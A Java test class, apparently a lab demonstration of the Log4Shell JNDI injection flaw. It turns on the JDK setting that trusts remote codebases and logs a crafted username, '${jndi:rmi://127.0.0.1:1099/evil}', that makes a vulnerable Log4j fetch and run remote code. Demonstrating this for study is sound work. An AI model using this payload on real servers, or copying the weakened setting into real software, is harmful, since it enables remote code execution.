package com.wwh.security.test;

import org.apache.logging.log4j.LogManager;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class TargetServer {
    private static final Logger logger = LoggerFactory.getLogger(TargetServer.class);

    private static final org.apache.logging.log4j.Logger log4j = LogManager.getLogger(TargetServer.class);

    public static void main(String[] args) {

        // 有些高版本jdk需要打开此行代码
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        // 模拟填写数据,输入构造好的字符串,使受害服务器打印日志时执行远程的代码
        String username = "${jndi:rmi://127.0.0.1:1099/evil}";

        // String username = "张三";

        // 正常打印业务日志
        logger.error("输入参数 username:{}", username);

        log4j.error("纯log4j API用法，输入参数 username:{}", username);

        try {
            Thread.sleep(5000);
        } catch (Exception e) {
        }

        System.out.println("结束。。。");
    }

}
